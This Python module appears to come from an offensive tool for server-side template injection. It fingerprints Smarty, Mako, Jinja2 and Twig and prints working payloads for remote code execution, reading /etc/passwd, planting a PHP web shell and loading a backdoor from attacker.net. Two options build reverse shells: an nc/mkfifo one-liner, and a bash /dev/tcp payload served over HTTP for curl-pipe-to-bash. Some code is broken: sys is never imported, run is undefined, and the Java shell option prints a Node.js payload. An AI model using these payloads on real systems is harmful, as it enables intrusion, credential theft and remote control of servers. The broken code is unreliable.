from colorama import init, Fore
from .. import date
from http.server import BaseHTTPRequestHandler, HTTPServer
import os

# http server

class testHTTPServer_RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        message = open("tmp/revshell.txt", "r").read()
        self.wfile.write(bytes(message, "utf8"))
        return
    def run():
        print('Avvio del server...')

# Test payloads

def test_payload():
    print("\n" + date.INFO() + "Payload to test: ${" + Fore.CYAN + "7*7" + Fore.WHITE + "}")
    works = input(date.INFO() + "Works [y/n]: ")
    if works == "y":
        print(date.INFO() + "Payload to test: " + Fore.YELLOW + "a" + Fore.WHITE + "(" + Fore.CYAN + "*comment*" + Fore.WHITE + ")" + Fore.YELLOW + "b" + Fore.WHITE)
        works = input(date.INFO() + "Works [y/n]: ")
        if works == "y":
            print(date.SUCCESS() + "The SSTI exploit is: " + Fore.GREEN + "Smarty" + Fore.WHITE)
        else:
            print(date.INFO() + "Payload to test: ${" + Fore.CYAN + "\"z\"" + Fore.WHITE + "." + Fore.GREEN + "join" + Fore.WHITE + "(" + Fore.CYAN + "\"ab\"" + Fore.WHITE + ")}")
            works = input(date.INFO() + "Works [y/n]: ")
            if works == "y":
                print(date.SUCCESS() + "The SSTI exploit is: " + Fore.GREEN + "Mako" + Fore.WHITE)
            else:
                print(date.FAILED() + "Unknown payload")
    else:
        print(date.INFO() + "Payload to test: {{" + Fore.CYAN + "7*7" + Fore.WHITE + "}}")
        works = input(date.INFO() + "Works [y/n]: ")
        if works == "y":
            print(date.INFO() + "Payload to test: {{" + Fore.CYAN + "7*'7'" + Fore.WHITE + "}}")
            works = input(date.INFO() + "Works [y/n]: ")
            if works == "y":
                print(date.SUCCESS() + "The SSTI exploit is: " + Fore.GREEN + "Jinja2 " + Fore.WHITE + "and" + Fore.GREEN + " Twig" + Fore.WHITE)
            else:
                print(date.FAILED() + "Unknown payload")
        else:
            print(date.FAILED() + "Not vulnerable")

# Java Payloads

def java_payload(num):
    if num == 1: #basic injection
        print("\n" + date.INFO() + "Java - Basic injection:\n")
        print(Fore.WHITE + '''${''' + Fore.CYAN + '''7*7''' + Fore.WHITE + '''}
${{''' + Fore.CYAN + '''7*7''' + Fore.WHITE + '''}}
${''' + Fore.RED + '''class''' + Fore.WHITE + '''.''' + Fore.GREEN + '''getClassLoader''' + Fore.WHITE + '''()}
${''' + Fore.RED + '''class''' + Fore.WHITE + '''.''' + Fore.GREEN + '''getResource''' + Fore.WHITE + '''(''' + Fore.CYAN + '''""''' + Fore.WHITE + ''').''' + Fore.GREEN + '''getPath''' + Fore.WHITE + '''()}
${''' + Fore.RED + '''class''' + Fore.WHITE + '''.''' + Fore.GREEN + '''getResource''' + Fore.WHITE + '''(''' + Fore.CYAN + '''"../../../../../index.htm"''' + Fore.WHITE + ''').''' + Fore.GREEN + '''getContent''' + Fore.WHITE + '''()}
''')
    if num == 2: #Retrieve the system's environment variables
        print("\n" + date.INFO() + "Java - Retrieve the system's environment variables:\n")
        print(Fore.WHITE + "${" + Fore.YELLOW + "T" + Fore.WHITE + "(" + Fore.YELLOW + "java.lang.System" + Fore.WHITE + ")." + Fore.GREEN + "getenv" + Fore.WHITE + "()}")
    if num == 3: #Java - Retrieve /etc/passwd
        print(Fore.WHITE + "\n" + date.INFO() + "Java - Retrieve /etc/passwd:\n")
        print("${" + Fore.YELLOW + "T" + Fore.WHITE + "(" + Fore.YELLOW + "java.lang.Runtime" + Fore.WHITE + ")." + Fore.GREEN + "getRuntime" + Fore.WHITE + "()." + Fore.GREEN + "exec" + Fore.WHITE + "(" + Fore.CYAN + "'cat etc/passwd'" + Fore.WHITE + ")}")
    if num == 4: #Java - Spring Framework
        print(Fore.WHITE + "\n" + date.INFO() + "Java - Spring Framework:\n")
        print(Fore.CYAN + "*" + Fore.WHITE + "{" + Fore.YELLOW + "T" + Fore.WHITE + "(" + Fore.YELLOW + "org.apache.commons.io.IOUtils" + Fore.WHITE + ")." + Fore.GREEN + "toString" + Fore.WHITE + "(" + Fore.YELLOW + "T" + Fore.WHITE + "(" + Fore.YELLOW + "java.lang.Runtime" + Fore.WHITE + ")." + Fore.GREEN + "getRuntime" + Fore.WHITE + "()." + Fore.GREEN + "exec" + Fore.WHITE + "(" + Fore.CYAN + "'id'" + Fore.WHITE + ")." + Fore.GREEN + "getInputStream" + Fore.WHITE + "())}")
    if num == 5: #Java - Pebble
        print(Fore.WHITE + "\n" + date.INFO() + "Java - Pebble:\n")
        print("{{ variable." + Fore.GREEN + "getClass" + Fore.WHITE + "()." + Fore.GREEN + "forName" + Fore.WHITE + "('" + Fore.YELLOW + "java.lang.Runtime" + Fore.WHITE + "')." + Fore.GREEN + "getRuntime" + Fore.WHITE + "()." + Fore.GREEN + "exec(" + Fore.CYAN + "'ls -la'" + Fore.WHITE + ") }}")
    if num == 6:#Java - Reverse shell
        LHOST = input("\n" + date.INFO() + "Enter the LHOST => " + Fore.YELLOW)
        LPORT = input(date.INFO() + "Enter the LPORT => " + Fore.YELLOW)
        print(date.INFO() + "Java - Pebble:\n")
        print(Fore.WHITE + "{{range." + Fore.GREEN + "constructor" + Fore.WHITE + "(\"return global.process.mainModule." + Fore.GREEN + "require" + Fore.WHITE + "(" + Fore.CYAN + "'child_process'" + Fore.WHITE + ")." + Fore.GREEN + "execSync" + Fore.WHITE + "(" + Fore.CYAN + "'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + LHOST + " " + LPORT + " >/tmp/f~')\"" + Fore.WHITE + ")()}}")

# Smarty payloads

def smarty_payload():
    print("\n" + date.INFO() + "Smarty Pyloads:\n")
    print(Fore.WHITE + '''{''' + Fore.CYAN + '''$smarty''' + Fore.WHITE + '''.version}
{php}''' + Fore.RED + '''echo ''' + Fore.CYAN + ''' `id`''' + Fore.WHITE + ''';{''' + Fore.CYAN + '''/''' + Fore.WHITE + '''php} //deprecated in smarty v3
{''' + Fore.YELLOW + '''Smarty_Internal_Write_File''' + Fore.CYAN + '''::''' + Fore.GREEN + '''writeFile''' + Fore.WHITE +'''(''' + Fore.CYAN + '''$SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>"''' + Fore.WHITE + ''',''' + Fore.RED + '''self''' + Fore.CYAN + '''::''' + Fore.GREEN + '''clearConfig''' + Fore.WHITE + '''())}
{''' + Fore.GREEN + '''system''' + Fore.WHITE + '''(''' + Fore.CYAN + '''\'ls\'''' + Fore.WHITE + ''')} // compatible v3
{''' + Fore.GREEN + '''system''' + Fore.WHITE + '''(''' + Fore.CYAN + '''\'cat index.php\'''' + Fore.WHITE + ''')} // compatible v3''')

# Mako payloads

def mako_payload():
    print("\n" + date.INFO() + "Mako Pyloads:\n")
    print(Fore.CYAN + '''<%
''' + Fore.RED + '''import ''' + Fore.WHITE + '''os
x''' + Fore.CYAN + '''=''' + Fore.WHITE + '''os.popen(''' + Fore.CYAN + '''\'id\'''' + Fore.WHITE + ''').read()
''' + Fore.CYAN + '''%>
''' + Fore.WHITE + '''${x}''')

# Jinja2 payloads

def jinja2_payload(num):
    if num == 1:
        print(date.INFO() + "Jinja2 - Template format:\n")
        print('''{''' + Fore.CYAN + '''%''' + Fore.WHITE + ''' extends ''' + Fore.CYAN + '''"layout.html" %''' + Fore.WHITE + '''}
{''' + Fore.CYAN + '''%''' + Fore.WHITE + ''' block body ''' + Fore.CYAN + '''%''' + Fore.WHITE + '''}
  ''' + Fore.CYAN + '''<''' + Fore.WHITE + '''ul''' + Fore.CYAN + '''>
  ''' + Fore.WHITE + '''{''' + Fore.CYAN + '''%''' + Fore.RED + ''' for''' + Fore.WHITE + ''' user''' + Fore.RED + ''' in''' + Fore.WHITE + ''' users ''' + Fore.CYAN + '''%''' + Fore.WHITE + '''}
    ''' + Fore.CYAN + '''<''' + Fore.WHITE + '''li''' + Fore.CYAN + '''><''' + Fore.WHITE + '''a href''' + Fore.CYAN + '''="{{ user.url }}">''' + Fore.WHITE + '''{{ user.username }}''' + Fore.CYAN + '''</''' + Fore.WHITE + '''a''' + Fore.CYAN + '''></''' + Fore.WHITE + '''li''' + Fore.CYAN + '''>
  ''' + Fore.WHITE + '''{''' + Fore.CYAN + '''%''' + Fore.WHITE + ''' endfor ''' + Fore.CYAN + '''%''' + Fore.WHITE + '''}
  ''' + Fore.CYAN + '''</''' + Fore.WHITE + '''ul''' + Fore.CYAN + '''>
''' + Fore.WHITE + '''{''' + Fore.CYAN + '''%''' + Fore.WHITE + ''' endblock ''' + Fore.CYAN + '''%''' + Fore.WHITE + '''}''')
        print("\n" + date.INFO() + "Jinja2 - RCE:\n")
        print('''{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(''' + Fore.CYAN + '''\'id\'''' + Fore.WHITE + ''').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen(''' + Fore.CYAN + '''\'id\'''' + Fore.WHITE + ''').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen(''' + Fore.CYAN + '''\'id\'''' + Fore.WHITE + ''').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen(''' + Fore.CYAN + '''\'id\'''' + Fore.WHITE + ''').read() }}
{{ joiner.__init__.__globals__.os.popen(''' + Fore.CYAN + '''\'id\'''' + Fore.WHITE + ''').read() }}
{{ namespace.__init__.__globals__.os.popen(''' + Fore.CYAN + '''\'id\'''' + Fore.WHITE + ''').read() }}''')
    elif num == 2:
        LHOST = input("\n" + date.INFO() + "Enter the LHOST => " + Fore.YELLOW)
        LPORT = input(date.INFO() + "Enter the LPORT => " + Fore.YELLOW)
        if os.path.isdir("tmp") == False:
            print(date.INFO() + "Creating the tmp folder")
            os.mkdir("tmp/")
            print(date.INFO() + "Done")
        try:
            print(date.INFO() + "Generating tmp/revshell.txt")
            open("tmp/revshell.txt", "w").write("bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1")
            print(date.INFO() + "Done")
            print(date.INFO() + "Jinja2 - Reverse shell:\n")
            print("{{ cycler.__init__.__globals__.os.popen(" + Fore.CYAN + "'curl http://" + LHOST + ":8081 | bash'" + Fore.WHITE + ").read() }}")
            server_address = (LHOST, 8081)
            httpd = HTTPServer(server_address, testHTTPServer_RequestHandler)
            print('\nServer running on: ' + LHOST + ':8081 \n')
            httpd.serve_forever()
            run()
        except KeyboardInterrupt:
            print("\n\n" + date.INFO() + "KeyboardInterrupt detected")
            print(date.INFO() + "Exiting...")
            sys.exit()

# Twig payloads

def twig_payload():
    print("\n" + date.INFO() + "Twig Payloads:")
    print(date.INFO() + "Twig - Template format:\n")
    print(Fore.CYAN + '''$output = $twig > ''' + Fore.GREEN + '''render ''' + Fore.WHITE + '''(
  ''' + Fore.CYAN + '''\'Dear\' . $_GET''' + Fore.WHITE + '''[''' + Fore.CYAN + '''\'custom_greeting\'''' + Fore.WHITE + '''],
                 ''' + Fore.RED + '''array''' + Fore.WHITE + '''(''' + Fore.WHITE + '''"first_name" => $user.''' + Fore.WHITE + '''first_name)
);

''' + Fore.CYAN + '''$output = $twig > ''' + Fore.GREEN + '''render''' + Fore.WHITE + ''' (
  ''' + Fore.CYAN + '''"Dear {first_name}"''' + Fore.WHITE + ''',
  ''' + Fore.RED + '''array''' + Fore.WHITE + '''(''' + Fore.CYAN + '''"first_name" => $user.''' + Fore.WHITE + '''first_name)
);''')
    print("\n" + date.INFO() + "Twig - RCE:\n")
    print(Fore.WHITE + '''#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.''' + Fore.RED + '''all''' + Fore.CYAN + '''|''' + Fore.WHITE + '''join(''' + Fore.CYAN + '''\',\'''' + Fore.WHITE + ''')}}

#File read
''' + Fore.CYAN + '''"{{'/etc/passwd'|file_excerpt(1,30)}}"''' + Fore.WHITE + '''@

#Exec code
{{_self.env.setCache(''' + Fore.CYAN + '''"ftp://attacker.net:2121"''' + Fore.WHITE + ''')}}{{_self.env.loadTemplate(''' + Fore.CYAN + '''"backdoor"''' + Fore.WHITE + ''')}}
{{_self.env.registerUndefinedFilterCallback(''' + Fore.CYAN + '''"exec"''' + Fore.WHITE + ''')}}{{_self.env.getFilter(''' + Fore.CYAN + '''"id"''' + Fore.WHITE + ''')}}
{{_self.env.registerUndefinedFilterCallback(''' + Fore.CYAN + '''"system"''' + Fore.WHITE + ''')}}{{_self.env.getFilter(''' + Fore.CYAN + '''"whoami"''' + Fore.WHITE + ''')}}
{{_self.env.registerUndefinedFilterCallback(''' + Fore.CYAN + '''"system"''' + Fore.WHITE + ''')}}{{_self.env.getFilter(''' + Fore.CYAN + '''"id;uname -a;hostname"''' + Fore.WHITE + ''')}}
{{[''' + Fore.CYAN + '''\'id\'''' + Fore.WHITE + ''']''' + Fore.CYAN + '''|''' + Fore.RED + '''filter''' + Fore.WHITE + '''(''' + Fore.CYAN + '''\'system\'''' + Fore.WHITE + ''')}}
{{[''' + Fore.CYAN + '''\'cat\x20/etc/passwd\'''' + Fore.WHITE + ''']''' + Fore.CYAN + '''|''' + Fore.RED + '''filter''' + Fore.WHITE + '''(''' + Fore.CYAN + '''\'system\'''' + Fore.WHITE + ''')}}
{{[''' + Fore.CYAN + '''\'cat$IFS/etc/passwd\'''' + Fore.WHITE + ''']''' + Fore.CYAN + '''|''' + Fore.RED + '''filter''' + Fore.WHITE + '''(''' + Fore.CYAN + '''\'system\'''' + Fore.WHITE + ''')}}''')